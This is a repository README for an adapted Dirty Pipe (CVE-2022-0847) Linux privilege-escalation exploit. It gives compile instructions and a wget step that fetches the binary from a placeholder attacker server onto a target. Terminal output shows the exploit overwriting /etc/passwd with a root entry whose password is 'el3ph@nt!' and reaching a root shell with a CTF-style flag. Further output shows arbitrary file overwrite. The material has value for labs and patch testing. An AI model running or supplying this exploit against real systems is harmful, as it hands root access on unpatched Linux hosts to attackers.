# Dirty Pipe Exploit: CVE-2022-0847
The Dirty Pipe vulnerability, also known as CVE-2022-0847, is a significant flaw within the Linux kernel. This repository provides an adapted version of the widely used exploit code to make it more user-friendly and modular.

A very good explanation of this vulnerability can be found on the [HackTheBox blog](https://www.hackthebox.com/blog/Dirty-Pipe-Explained-CVE-2022-0847). Max Kellermann's original, more detailed explanation can be found [on his blog](https://dirtypipe.cm4all.com/).

This adapted version is segmented into different methods to increase modularity and ease of modification. Notably, there's an added --root option that modifies the /etc/passwd file, to leverage root access with password `el3ph@nt!`.

Compile the exploit statically:
```shell
gcc -o dpipe dpipe.c -static
```

And retrieve-it from your target before launching-it:
```shell
yoan@teecup:~$ wget http://YOUR_SERVER_ADDRESS/unix/cve/dpipe
--2023-10-15 20:07:44--  http://YOUR_SERVER_ADDRESS/unix/cve/dpipe
Connecting to YOUR_SERVER_ADDRESS:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 769792 (752K) [text/plain]
Saving to: ‘dpipe’

dpipe                                   100%[=============================================================================>] 751.75K  --.-KB/s    in 0.09s

2023-10-15 20:07:44 (8.09 MB/s) - ‘dpipe’ saved [769792/769792]

yoan@teecup:~$ chmod +x dpipe
yoan@teecup:~$ ./dpipe --root
[Dirty Pipe] Attempting to backup '/etc/passwd' to '/tmp/passwd.bak'
[Dirty Pipe] Successfully backed up '/etc/passwd' to '/tmp/passwd.bak'
[Dirty Pipe] Initiating write to '/etc/passwd'...
[Dirty Pipe] Data size to write: 131 bytes
[Dirty Pipe] File '/etc/passwd' opened successfully for reading.
[Dirty Pipe] Pipe size determined: 65536 bytes
[Dirty Pipe] Filling the pipe...
[Dirty Pipe] Pipe filled successfully.
[Dirty Pipe] Draining the pipe...
[Dirty Pipe] Pipe drained successfully.
[Dirty Pipe] Data successfully written to '/etc/passwd'.
[Dirty Pipe] You can connect as root with password 'el3ph@nt!'
[Dirty Pipe] Program execution completed successfully.
yoan@teecup:~$
yoan@teecup:~$ cat /etc/passwd
root:$6$9WETWbCBTQ8pxg4I$odZAx8iIlayCnFdUwDM5dHVfsXXZo1RHRp2a4uQzcPDkRiTJYLA4loZESihn4ASGhWKN9.RWPT.CZJdyfTej4/:0:0:root:/root:/bin/sh
:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
yoan:x:1000:1000::/home/yoan:/bin/bash
yoan@teecup:~$ su root
Password:
# cd /root
# cat flag.txt
Great job! You found me.
```

You can also use the exploit to overwrite content in other files:
```shell
yoan@teecup:~$ echo "Vxxx" > dirty
yoan@teecup:~$ cat dirty
Vxxx
yoan@teecup:~$ ./dpipe dirty 1 uln
[Dirty Pipe] Standard file overwrite mode detected...
[Dirty Pipe] Attempting to backup 'dirty' to '/tmp/dirty.bak'
[Dirty Pipe] Successfully backed up 'dirty' to '/tmp/dirty.bak'
[Dirty Pipe] Initiating write to 'dirty'...
[Dirty Pipe] Data size to write: 3 bytes
[Dirty Pipe] File 'dirty' opened successfully for reading.
[Dirty Pipe] Pipe size determined: 65536 bytes
[Dirty Pipe] Filling the pipe...
[Dirty Pipe] Pipe filled successfully.
[Dirty Pipe] Draining the pipe...
[Dirty Pipe] Pipe drained successfully.
[Dirty Pipe] Data successfully written to 'dirty'.
[Dirty Pipe] Program execution completed successfully.
yoan@teecup:~$ cat dirty
Vuln
```
